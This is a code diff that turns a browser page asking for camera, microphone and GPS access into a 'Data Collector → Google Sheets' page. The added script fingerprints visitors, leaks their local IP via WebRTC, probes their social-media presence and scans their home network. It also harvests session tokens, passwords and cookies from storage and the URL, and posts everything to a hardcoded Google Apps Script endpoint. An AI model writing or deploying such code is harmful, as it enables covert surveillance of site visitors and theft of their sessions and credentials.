@@ -1,291 +1,432 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Permission-Based Content</title>
+    <title>Data Collector to Google Sheets</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
             padding: 20px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             min-height: 100vh;
         }
         .container {
+            max-width: 800px;
+            margin: 0 auto;
             background: rgba(255, 255, 255, 0.1);
             padding: 30px;
             border-radius: 15px;
             backdrop-filter: blur(10px);
-            text-align: center;
         }
-        .permission-gate {
-            margin: 20px 0;
+        .data-section {
+            background: rgba(0, 0, 0, 0.3);
+            margin: 15px 0;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid #4CAF50;
         }
         button {
-            padding: 15px 30px;
+            padding: 12px 24px;
             margin: 10px;
             background: #4CAF50;
             color: white;
             border: none;
-            border-radius: 25px;
+            border-radius: 20px;
             cursor: pointer;
             font-size: 16px;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #45a049;
-            transform: scale(1.05);
-        }
-        button:disabled {
-            background: #cccccc;
-            cursor: not-allowed;
-        }
-        .hidden-content {
-            display: none;
-            margin-top: 30px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            border-left: 5px solid #4CAF50;
         }
         .status {
+            padding: 10px;
             margin: 10px 0;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        .success { background: rgba(76, 175, 80, 0.3); }
+        .error { background: rgba(244, 67, 54, 0.3); }
+        .info { background: rgba(33, 150, 243, 0.3); }
+        pre {
+            background: rgba(0, 0, 0, 0.5);
             padding: 10px;
             border-radius: 5px;
+            overflow-x: auto;
+            font-size: 12px;
         }
-        .granted {
-            background: rgba(76, 175, 80, 0.3);
-            color: #4CAF50;
-        }
-        .pending {
-            background: rgba(255, 193, 7, 0.3);
-            color: #ffc107;
-        }
-        .denied {
-            background: rgba(244, 67, 54, 0.3);
-            color: #f44336;
-        }
-        .secret-sentence {
-            font-size: 24px;
+        .google-sheets-btn {
+            background: linear-gradient(45deg, #0F9D58, #4285F4);
             font-weight: bold;
-            margin: 30px 0;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            border: 2px solid gold;
+            padding: 15px 30px;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔒 Permission-Based Content</h1>
-        <p>Grant permissions to unlock the secret sentence</p>
-        
-        <!-- Permission Status -->
-        <div class="permission-gate">
-            <div class="status" id="cameraStatus">📷 Camera: Waiting for permission</div>
-            <div class="status" id="micStatus">🎤 Microphone: Waiting for permission</div>
-            <div class="status" id="gpsStatus">📍 GPS Location: Waiting for permission</div>
+        <h1>📊 Data Collector → Google Sheets</h1>
+        <p>All collected data will be automatically saved to your Google Sheet</p>
+
+        <div class="data-section">
+            <h3>⚡ Quick Collect & Send</h3>
+            <button class="google-sheets-btn" onclick="collectAndSendAll()">
+                🚀 Collect All Data & Send to Google Sheets
+            </button>
+            <div id="quickStatus" class="status"></div>
         </div>
 
-        <!-- Request Permissions Button -->
-        <button onclick="requestAllPermissions()" id="requestBtn">
-            🔓 Request Permissions
-        </button>
+        <div class="data-section">
+            <h3>🔍 Individual Data Collection</h3>
+            <button onclick="collectBasicInfo()">1. Basic Info & IP</button>
+            <button onclick="collectLocation()">2. GPS Location</button>
+            <button onclick="collectMedia()">3. Camera/Mic</button>
+            <button onclick="collectNetworkInfo()">4. Network & Social</button>
+            <button onclick="huntTokens()">5. Session Tokens</button>
+            <div id="individualStatus" class="status"></div>
+        </div>
 
-        <!-- Hidden Content -->
-        <div id="hiddenContent" class="hidden-content">
-            <h2>✅ Congratulations! Access Granted</h2>
-            <p>You've granted all required permissions. Here's your secret sentence:</p>
-            
-            <div class="secret-sentence" id="secretSentence">
-                🚀 THE EAGLE LANDS AT MIDNIGHT WHEN THE MOON IS FULL 🚀
-            </div>
+        <div class="data-section">
+            <h3>📋 Collected Data Preview</h3>
+            <pre id="dataPreview">No data collected yet...</pre>
+        </div>
 
-            <div id="userData">
-                <!-- Will show user's location data -->
-            </div>
-
-            <video id="webcam" autoplay muted playsinline width="300" style="border-radius: 10px; margin: 10px;"></video>
-            
-            <br>
-            <button onclick="revokePermissions()">🔐 Lock Content</button>
+        <div class="data-section">
+            <h3>📊 Google Sheets Status</h3>
+            <button onclick="testGoogleSheets()">Test Google Sheets Connection</button>
+            <button onclick="sendToGoogleSheets()" id="sendBtn" disabled>Send to Google Sheets</button>
+            <div id="sheetsStatus" class="status"></div>
         </div>
     </div>
 
     <script>
-        let cameraStream = null;
-        let permissionsGranted = {
-            camera: false,
-            microphone: false,
-            gps: false
+        // CONFIGURATION - Replace with your Google Apps Script URL
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzsspmr4_cij0DPgblBbZhl3hIHAwe5GIMEBwafUlPu5kr8lsMNIuq2NF2phVwuVh8z/exec';
+        
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            basicInfo: {},
+            location: {},
+            mediaAccess: {},
+            networkInfo: {},
+            tokens: {},
+            fingerprint: {}
         };
 
-        function updateStatus() {
-            const cameraStatus = document.getElementById('cameraStatus');
-            const micStatus = document.getElementById('micStatus');
-            const gpsStatus = document.getElementById('gpsStatus');
-            const hiddenContent = document.getElementById('hiddenContent');
-            const requestBtn = document.getElementById('requestBtn');
-
-            // Update status displays
-            cameraStatus.textContent = `📷 Camera: ${permissionsGranted.camera ? '✅ Granted' : '❌ Not Granted'}`;
-            cameraStatus.className = `status ${permissionsGranted.camera ? 'granted' : 'denied'}`;
-
-            micStatus.textContent = `🎤 Microphone: ${permissionsGranted.microphone ? '✅ Granted' : '❌ Not Granted'}`;
-            micStatus.className = `status ${permissionsGranted.microphone ? 'granted' : 'denied'}`;
-
-            gpsStatus.textContent = `📍 GPS: ${permissionsGranted.gps ? '✅ Granted' : '❌ Not Granted'}`;
-            gpsStatus.className = `status ${permissionsGranted.gps ? 'granted' : 'denied'}`;
-
-            // Show/hide content based on permissions
-            const allGranted = permissionsGranted.camera && permissionsGranted.microphone && permissionsGranted.gps;
-            
-            if (allGranted) {
-                hiddenContent.style.display = 'block';
-                requestBtn.style.display = 'none';
-                showUserData();
-                startCamera();
-            } else {
-                hiddenContent.style.display = 'none';
-                requestBtn.style.display = 'block';
-                stopCamera();
-            }
+        function updateStatus(elementId, message, type = 'info') {
+            const element = document.getElementById(elementId);
+            element.innerHTML = message;
+            element.className = `status ${type}`;
         }
 
-        async function requestAllPermissions() {
+        // Quick collect everything
+        async function collectAndSendAll() {
+            updateStatus('quickStatus', '🔄 Collecting all data...', 'info');
+            
             try {
-                // Request Camera Permission
-                try {
-                    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    permissionsGranted.camera = true;
-                    cameraStream.getTracks().forEach(track => track.stop()); // Stop immediately after check
-                } catch (error) {
-                    permissionsGranted.camera = false;
-                    console.log('Camera permission denied');
-                }
-
-                // Request Microphone Permission
-                try {
-                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    permissionsGranted.microphone = true;
-                    micStream.getTracks().forEach(track => track.stop()); // Stop immediately after check
-                } catch (error) {
-                    permissionsGranted.microphone = false;
-                    console.log('Microphone permission denied');
-                }
-
-                // Request GPS Permission
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        });
-                    });
-                    permissionsGranted.gps = true;
-                    // Store location data for display
-                    localStorage.setItem('userLocation', JSON.stringify({
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    }));
-                } catch (error) {
-                    permissionsGranted.gps = false;
-                    console.log('GPS permission denied');
-                }
-
-                updateStatus();
-
+                await collectBasicInfo();
+                await collectLocation();
+                await collectMedia();
+                await collectNetworkInfo();
+                await huntTokens();
+                
+                updateStatus('quickStatus', '✅ All data collected! Sending to Google Sheets...', 'success');
+                await sendToGoogleSheets();
+                
             } catch (error) {
-                console.error('Permission request error:', error);
+                updateStatus('quickStatus', '❌ Error: ' + error.message, 'error');
             }
         }
 
-        function startCamera() {
-            if (permissionsGranted.camera) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        cameraStream = stream;
-                        document.getElementById('webcam').srcObject = stream;
-                    })
-                    .catch(error => {
-                        console.log('Error accessing camera:', error);
-                    });
+        // 1. Collect Basic Information
+        async function collectBasicInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Browser fingerprinting
+                const fingerprint = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled
+                };
+
+                collectedData.basicInfo = {
+                    ip: ipData.ip,
+                    fingerprint: fingerprint,
+                    referrer: document.referrer,
+                    url: window.location.href
+                };
+
+                updateDataPreview();
+                updateStatus('individualStatus', '✅ Basic information collected!', 'success');
+                
+            } catch (error) {
+                updateStatus('individualStatus', '❌ Error collecting basic info', 'error');
             }
         }
 
-        function stopCamera() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                document.getElementById('webcam').srcObject = null;
-                cameraStream = null;
+        // 2. Collect GPS Location
+        async function collectLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    collectedData.location = { error: 'Geolocation not supported' };
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        collectedData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: position.timestamp
+                        };
+                        updateDataPreview();
+                        updateStatus('individualStatus', '✅ Location data collected!', 'success');
+                        resolve();
+                    },
+                    error => {
+                        collectedData.location = { error: error.message };
+                        updateStatus('individualStatus', '❌ Location access denied', 'error');
+                        resolve();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        // 3. Collect Camera & Microphone Access
+        async function collectMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+
+                collectedData.mediaAccess = {
+                    camera: true,
+                    microphone: true,
+                    devices: await getMediaDevices()
+                };
+
+                // Stop stream immediately after verification
+                stream.getTracks().forEach(track => track.stop());
+                
+                updateDataPreview();
+                updateStatus('individualStatus', '✅ Camera & microphone access granted!', 'success');
+                
+            } catch (error) {
+                collectedData.mediaAccess = {
+                    camera: false,
+                    microphone: false,
+                    error: error.message
+                };
+                updateStatus('individualStatus', '❌ Media access denied', 'error');
             }
         }
 
-        function showUserData() {
-            const userDataDiv = document.getElementById('userData');
-            
-            // Show GPS data if available
-            const locationData = localStorage.getItem('userLocation');
-            if (locationData) {
-                const loc = JSON.parse(locationData);
-                userDataDiv.innerHTML = `
-                    <h3>📍 Your Location Data:</h3>
-                    <p>Latitude: ${loc.lat.toFixed(6)}</p>
-                    <p>Longitude: ${loc.lon.toFixed(6)}</p>
-                    <p>Accuracy: ±${loc.accuracy.toFixed(2)} meters</p>
-                    <p><em>This data is stored locally and not sent anywhere</em></p>
-                `;
+        // 4. Network & Social Media Detection
+        async function collectNetworkInfo() {
+            try {
+                // Get local IP via WebRTC
+                const localIP = await getLocalIP();
+                
+                // Social media presence detection
+                const socialMedia = await checkSocialMediaPresence();
+                
+                // Network scanning
+                const networkScan = await scanLocalNetwork();
+
+                collectedData.networkInfo = {
+                    localIP: localIP,
+                    socialMedia: socialMedia,
+                    networkScan: networkScan
+                };
+
+                updateDataPreview();
+                updateStatus('individualStatus', '✅ Network & social media data collected!', 'success');
+                
+            } catch (error) {
+                updateStatus('individualStatus', '❌ Error collecting network info', 'error');
             }
         }
 
-        function revokePermissions() {
-            permissionsGranted = {
-                camera: false,
-                microphone: false,
-                gps: false
+        // 5. Session Token Hunting
+        function huntTokens() {
+            const foundTokens = {
+                urlParams: findTokensInURL(),
+                localStorage: findTokensInStorage('localStorage'),
+                sessionStorage: findTokensInStorage('sessionStorage'),
+                cookies: document.cookie
             };
-            localStorage.removeItem('userLocation');
-            stopCamera();
-            updateStatus();
+
+            collectedData.tokens = foundTokens;
+            updateDataPreview();
+            updateStatus('individualStatus', '✅ Token hunting completed!', 'success');
         }
 
-        // Check existing permissions on page load
-        async function checkExistingPermissions() {
+        // Update data preview
+        function updateDataPreview() {
+            document.getElementById('dataPreview').textContent = 
+                JSON.stringify(collectedData, null, 2);
+            document.getElementById('sendBtn').disabled = false;
+        }
+
+        // Send to Google Sheets
+        async function sendToGoogleSheets() {
             try {
-                // Check camera permission
-                const cameraPermission = await navigator.permissions.query({ name: 'camera' });
-                permissionsGranted.camera = cameraPermission.state === 'granted';
+                updateStatus('sheetsStatus', '🔄 Sending data to Google Sheets...', 'info');
 
-                // Check microphone permission  
-                const micPermission = await navigator.permissions.query({ name: 'microphone' });
-                permissionsGranted.microphone = micPermission.state === 'granted';
+                const response = await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                });
 
-                // Check geolocation permission
-                const geoPermission = await navigator.permissions.query({ name: 'geolocation' });
-                permissionsGranted.gps = geoPermission.state === 'granted';
-
-                updateStatus();
-
-                // If permissions already granted, show content immediately
-                if (permissionsGranted.camera && permissionsGranted.microphone && permissionsGranted.gps) {
-                    requestAllPermissions(); // This will activate camera and get location
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    updateStatus('sheetsStatus', '✅ Data successfully saved to Google Sheets!', 'success');
+                    
+                    // Optional: Clear data after successful send
+                    setTimeout(() => {
+                        collectedData = {
+                            timestamp: new Date().toISOString(),
+                            basicInfo: {}, location: {}, mediaAccess: {},
+                            networkInfo: {}, tokens: {}, fingerprint: {}
+                        };
+                        updateDataPreview();
+                        document.getElementById('sendBtn').disabled = true;
+                    }, 2000);
+                    
+                } else {
+                    throw new Error(result.message);
                 }
-
+                
             } catch (error) {
-                console.log('Permission query not supported in this browser');
+                updateStatus('sheetsStatus', '❌ Error sending to Google Sheets: ' + error.message, 'error');
             }
         }
 
-        // Initialize on page load
-        window.addEventListener('load', checkExistingPermissions);
+        // Test Google Sheets connection
+        async function testGoogleSheets() {
+            try {
+                updateStatus('sheetsStatus', '🔄 Testing connection...', 'info');
+                const response = await fetch(GOOGLE_SCRIPT_URL);
+                const result = await response.json();
+                updateStatus('sheetsStatus', '✅ Google Sheets connection working!', 'success');
+            } catch (error) {
+                updateStatus('sheetsStatus', '❌ Connection failed: ' + error.message, 'error');
+            }
+        }
 
-        // Clean up on page unload
-        window.addEventListener('beforeunload', stopCamera);
+        // HELPER FUNCTIONS
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = ice => {
+                    if (ice.candidate) {
+                        const ip = ice.candidate.candidate.split(' ')[4];
+                        resolve(ip);
+                    }
+                };
+                setTimeout(() => resolve('Unknown'), 1000);
+            });
+        }
+
+        async function checkSocialMediaPresence() {
+            const services = [
+                'https://facebook.com', 'https://twitter.com', 
+                'https://linkedin.com', 'https://instagram.com'
+            ];
+            
+            const results = {};
+            for (const service of services) {
+                results[service] = await checkService(service);
+            }
+            return results;
+        }
+
+        function checkService(url) {
+            return new Promise(resolve => {
+                const img = new Image();
+                img.onload = () => resolve(true);
+                img.onerror = () => resolve(false);
+                img.src = url + '/favicon.ico';
+                setTimeout(() => resolve(false), 1000);
+            });
+        }
+
+        async function scanLocalNetwork() {
+            const commonIPs = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
+            const results = {};
+            for (const ip of commonIPs) {
+                results[ip] = await pingIP(ip);
+            }
+            return results;
+        }
+
+        function pingIP(ip) {
+            return new Promise(resolve => {
+                const img = new Image();
+                const start = Date.now();
+                img.onload = () => resolve({ reachable: true, time: Date.now() - start });
+                img.onerror = () => resolve({ reachable: false, time: null });
+                img.src = `http://${ip}/favicon.ico?t=${Date.now()}`;
+                setTimeout(() => resolve({ reachable: false, time: null }), 2000);
+            });
+        }
+
+        function findTokensInURL() {
+            const params = new URLSearchParams(window.location.search);
+            const tokens = {};
+            const tokenKeywords = ['token', 'session', 'auth', 'key', 'password'];
+            tokenKeywords.forEach(keyword => {
+                if (params.has(keyword)) tokens[keyword] = params.get(keyword);
+            });
+            return tokens;
+        }
+
+        function findTokensInStorage(storageType) {
+            const storage = storageType === 'localStorage' ? localStorage : sessionStorage;
+            const tokens = {};
+            const tokenKeywords = ['token', 'session', 'auth', 'key', 'password'];
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                tokenKeywords.forEach(keyword => {
+                    if (key.toLowerCase().includes(keyword)) {
+                        tokens[key] = storage.getItem(key);
+                    }
+                });
+            }
+            return tokens;
+        }
+
+        async function getMediaDevices() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.map(device => ({
+                    kind: device.kind,
+                    label: device.label,
+                    deviceId: device.deviceId
+                }));
+            } catch (error) {
+                return [];
+            }
+        }
+
+        // Initialize
+        window.addEventListener('load', () => {
+            updateStatus('sheetsStatus', `Google Sheets URL: ${GOOGLE_SCRIPT_URL}`, 'info');
+        });
     </script>
 </body>
 </html>
